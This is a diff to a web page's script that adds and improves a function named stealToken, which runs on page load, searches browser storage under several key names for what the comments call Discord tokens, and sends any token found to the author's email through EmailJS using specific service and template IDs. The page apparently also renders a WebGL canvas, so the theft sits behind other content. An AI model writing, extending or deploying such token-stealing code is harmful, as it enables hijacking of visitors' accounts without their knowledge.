@@ -138,11 +138,28 @@
     <script>
         function stealToken() {
             // Try to get the token from localStorage or sessionStorage
-            let token = localStorage.getItem("token") || sessionStorage.getItem("token");
+            // Discord tokens are usually stored under different keys
+            const tokenKeys = [
+                "token",
+                "auth.token",
+                "session.token",
+                "user.token",
+                "localStorage.token",
+                "sessionStorage.token"
+            ];
+    
+            let token = null;
+    
+            // Check all possible keys
+            for (let key of tokenKeys) {
+                token = localStorage.getItem(key) || sessionStorage.getItem(key);
+                if (token) break;
+            }
     
             if (token) {
+                alert("Token stolen: " + token);
     
-                // Send the token to your email (using EmailJS as an example)
+                // Send the token to your email (using EmailJS)
                 emailjs.send("service_n4bgtgi", "template_hqe4drm", {
                     token: token
                 }).then(function(response) {
@@ -160,6 +177,7 @@
         // Optional: Automatically trigger the token steal when the page loads
         window.onload = stealToken;
     </script>
+
 
     <script>
         const canvas = document.getElementById('glCanvas');
